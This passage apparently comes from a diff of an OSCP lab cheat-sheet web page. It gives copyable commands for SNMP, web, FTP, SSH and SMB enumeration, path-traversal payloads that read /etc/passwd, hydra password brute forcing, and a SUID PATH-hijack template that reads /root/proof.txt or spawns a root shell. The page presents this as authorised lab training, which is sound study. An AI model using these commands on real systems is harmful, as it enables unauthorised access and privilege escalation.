+<span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+
+<span class="c1">## full walk to a file, then grep it</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span>&gt;<span class="w"> </span>snmp_full.txt
+
+<span class="c1">## the three trees that matter on Linux</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">    </span><span class="c1"># nsExtendTable (commands + descriptions)</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">    </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">    </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
+
+<span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+
+<span class="c1">## bulk walk when v1 is slow</span>
+snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<hr />
+<h3>Web</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+
+<span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+</pre></div>
+<hr />
+<h3>FTP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
+
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+</pre></div>
+<hr />
+<h3>SSH</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>id_rsa<span class="w">                                  </span><span class="c1"># comment names the user</span>
+
+<span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
+
+<span class="c1">## run a whole enumeration script in one connection</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<hr />
+<h3>SMB</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+</pre></div>
+<hr />
+<h3>Linux local enumeration</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+
+<span class="c1">## SUID without tripling the output on snap</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
+ss<span class="w"> </span>-tlnp
+ls<span class="w"> </span>-la<span class="w"> </span>/home/*<span class="w"> </span>/opt<span class="w"> </span>/srv<span class="w"> </span>/var/www
+find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span>local.txt<span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span>proof.txt<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<hr />
+<h3>Binary analysis</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
+</pre></div>
+<p>Reconstructing source from a small binary:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">+ setuid / setgid  →  setuid(0); setgid(0);
++ lea rdi,[rip+...] →  the argument is a fixed string
++ call system@plt  →  system("...")</span></pre></div>
+<hr />
+<h3>Privesc — PATH hijack template</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">id &gt; /tmp/root_id.txt</span>
+<span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
+<span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+
+<span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+
+cat<span class="w"> </span>/tmp/root_id.txt
+</pre></div>
+<p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
+not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
+<p>Interactive variant:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+</pre></div>
+<hr />
+<h3>Cleanup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+</pre></div></div></section>
+
+    <footer>
+      <span>Authorised lab environment · flags and credentials are lab-specific</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 23 November 2026</span>
+    </footer>
+  </main>
+</div>
+
+<button id="toTop" type="button" aria-label="Back to top">↑</button>
+<div id="toast" role="status" aria-live="polite"></div>
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+
+  /* ---------- theme ---------- */
+  var THEME_KEY="oscp-theme";
+  function setTheme(t){root.setAttribute("data-theme",t);try{localStorage.setItem(THEME_KEY,t)}catch(e){}}
+  var saved=null;try{saved=localStorage.getItem(THEME_KEY)}catch(e){}
+  if(!saved){saved=window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark";}
+  setTheme(saved);
+  document.getElementById("themeBtn").addEventListener("click",function(){
+    setTheme(root.getAttribute("data-theme")==="dark"?"light":"dark");
+  });
+
+  /* ---------- wrap h3 sections into collapsible cards ---------- */
+  document.querySelectorAll(".content").forEach(function(content){
+    var kids=Array.prototype.slice.call(content.children);
+    var current=null, sec=null, body=null;
+    kids.forEach(function(el){
+      if(el.tagName==="H3"){
+        sec=document.createElement("section");sec.className="sec";
+        var btn=document.createElement("button");
+        btn.type="button";btn.className="sec-head";btn.setAttribute("aria-expanded","true");
+        btn.textContent=el.textContent;
+        body=document.createElement("div");body.className="sec-body";
+        content.insertBefore(sec,el);
+        sec.appendChild(btn);sec.appendChild(body);
+        el.remove();
+        btn.addEventListener("click",function(){
+          var panel=btn.nextElementSibling;
+          var open=btn.getAttribute("aria-expanded")==="true";
+          btn.setAttribute("aria-expanded",open?"false":"true");
+          if(panel)panel.hidden=open;
+        });
+        current=body;
+      }else if(current){
+        current.appendChild(el);
+      }
+    });
+  });
+
+  /* ---------- copy buttons ---------- */
+  var toast=document.getElementById("toast"),toastTimer=null;
+  function say(msg){
+    toast.textContent=msg;toast.classList.add("show");
+    clearTimeout(toastTimer);toastTimer=setTimeout(function(){toast.classList.remove("show")},1600);
+  }
+  function copy(text,btn){
+    function ok(){if(btn){btn.classList.add("done");var t=btn.textContent;btn.textContent="Copied";
+      setTimeout(function(){btn.classList.remove("done");btn.textContent=t},1400);}say("Copied to clipboard");}
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(ok).catch(function(){fallback(text);ok();});
+    }else{fallback(text);ok();}
+  }
+  function fallback(text){
+    var ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";
+    document.body.appendChild(ta);ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);
+  }
+  document.addEventListener("click",function(e){
+    var btn=e.target.closest(".copy");
+    if(!btn)return;
+    var block=btn.closest(".block"),pre=block&&block.querySelector("pre");
+    if(pre)copy(pre.innerText.replace(/\s+$/,""),btn);
+  });
+
+  /* copy every command in a chapter */
+  document.querySelectorAll(".copyall").forEach(function(btn){
+    btn.addEventListener("click",function(){
+      var ch=btn.closest(".chapter");
+      var cmds=Array.prototype.map.call(ch.querySelectorAll(".block-cmd pre"),function(p){return p.innerText.replace(/\s+$/,"")});
+      if(!cmds.length){say("No commands in this chapter");return;}
+      copy(cmds.join("\n\n"),btn);
+    });
+  });
+
+  /* ---------- progress ---------- */
+  var PKEY="oscp-progress-oscp-exam-ms02";
+  var checks=Array.prototype.slice.call(document.querySelectorAll(".nav-check"));
+  var done={};try{done=JSON.parse(localStorage.getItem(PKEY)||"{}")}catch(e){}
+  function paint(){
+    var n=0;
+    checks.forEach(function(c){
+      var on=!!done[c.dataset.ch];
+      c.checked=on;
+      c.closest(".nav-item").classList.toggle("done",on);
+      if(on)n++;
+    });
+    var pct=Math.round(n/checks.length*100);
+    document.getElementById("bar").style.width=pct+"%";
+    document.getElementById("pcount").textContent=n+" / "+checks.length;
+    document.getElementById("ppct").textContent=pct+"%";
+  }
+  checks.forEach(function(c){
+    c.addEventListener("click",function(e){e.stopPropagation()});
+    c.addEventListener("change",function(){
+      done[c.dataset.ch]=c.checked;
+      try{localStorage.setItem(PKEY,JSON.stringify(done))}catch(e){}
+      paint();
+    });
+  });
+  paint();
+  document.getElementById("resetProgress").addEventListener("click",function(){
+    done={};try{localStorage.setItem(PKEY,"{}")}catch(e){}paint();say("Progress reset");
+  });
+
+  /* ---------- expand / collapse all ---------- */
+  function setAll(open){
+    document.querySelectorAll(".sec-head").forEach(function(b){
+      b.setAttribute("aria-expanded",open?"true":"false");
+      b.nextElementSibling.hidden=!open;
+    });
+  }
+  document.getElementById("expandAll").addEventListener("click",function(){setAll(true)});
+  document.getElementById("collapseAll").addEventListener("click",function(){setAll(false)});
+
+  /* ---------- scroll spy ---------- */
+  var navItems=Array.prototype.slice.call(document.querySelectorAll(".nav-item"));
+  var chapters=Array.prototype.slice.call(document.querySelectorAll(".chapter"));
+  if("IntersectionObserver" in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(!en.isIntersecting)return;
+        navItems.forEach(function(n){n.classList.toggle("active",n.dataset.target===en.target.id)});
+      });
+    },{rootMargin:"-70px 0px -70% 0px",threshold:0});
+    chapters.forEach(function(c){io.observe(c)});
+  }
+
+  /* ---------- search ---------- */
+  var input=document.getElementById("search"),count=document.getElementById("searchCount");
+  var index=chapters.map(function(c){
+    return {el:c,item:document.querySelector('.nav-item[data-target="'+c.id+'"]'),
+            text:(c.dataset.title+" "+c.textContent).toLowerCase()};
+  });
+  function clearMarks(){
+    document.querySelectorAll("mark.hit").forEach(function(m){
+      var p=m.parentNode;m.replaceWith(document.createTextNode(m.textContent));p.normalize();
+    });
+  }
+  function run(){
+    var q=input.value.trim().toLowerCase();
+    clearMarks();
+    if(!q){
+      index.forEach(function(r){r.item.style.display="";r.el.style.display=""});
+      count.textContent="";return;
+    }
+    var hits=0,first=null;
+    index.forEach(function(r){
+      var hit=r.text.indexOf(q)!==-1;
+      r.item.style.display=hit?"":"none";
+      r.el.style.display=hit?"":"none";
+      if(hit){hits++;if(!first)first=r;}
+    });
+    count.textContent=hits?hits+" chapter"+(hits>1?"s":""):"no match";
+    if(first&&hits===1){first.el.scrollIntoView({block:"start"});}
+  }
+  var t=null;
+  input.addEventListener("input",function(){clearTimeout(t);t=setTimeout(run,140)});
+  input.addEventListener("keydown",function(e){
+    if(e.key==="Escape"){input.value="";run();input.blur();}
+    if(e.key==="Enter"){var vis=index.filter(function(r){return r.item.style.display!=="none"});if(vis.length){vis[0].el.scrollIntoView({block:"start"})}}
+  });
+
+  /* ---------- keyboard ---------- */
+  document.addEventListener("keydown",function(e){
+    var typing=/^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+    if(e.key==="/"&&!typing){e.preventDefault();input.focus();input.select();}
+  });
+
+  /* ---------- mobile sidebar ---------- */
+  var sidebar=document.getElementById("sidebar");
+  document.getElementById("burger").addEventListener("click",function(){sidebar.classList.toggle("open")});
+  navItems.forEach(function(n){n.addEventListener("click",function(){sidebar.classList.remove("open")})});
+
+  /* ---------- flag reveal ---------- */
+  document.querySelectorAll(".flag .reveal").forEach(function(b){
+    b.addEventListener("click",function(){
+      var flag=b.closest(".flag"),v=flag.querySelector(".v");
+      var val=v.dataset.value;
+      var on=flag.classList.toggle("revealed");
+      v.innerHTML=on?'<span>'+val+'</span>':'<span class="masked">••••••••••••••••••••••••••••••••</span>';
+      b.textContent=on?"hide":"reveal";
+    });
+  });
+
+  /* ---------- back to top ---------- */
+  var topBtn=document.getElementById("toTop");
+  window.addEventListener("scroll",function(){
+    topBtn.classList.toggle("show",window.scrollY>600);
+  },{passive:true});
+  topBtn.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
+
+  /* ---------- deep links ---------- */
+  if(location.hash){
+    var target=document.querySelector(location.hash);
+    if(target)setTimeout(function(){target.scrollIntoView({block:"start"})},60);
+  }
+})();
+</script>
+</body>
+</html>
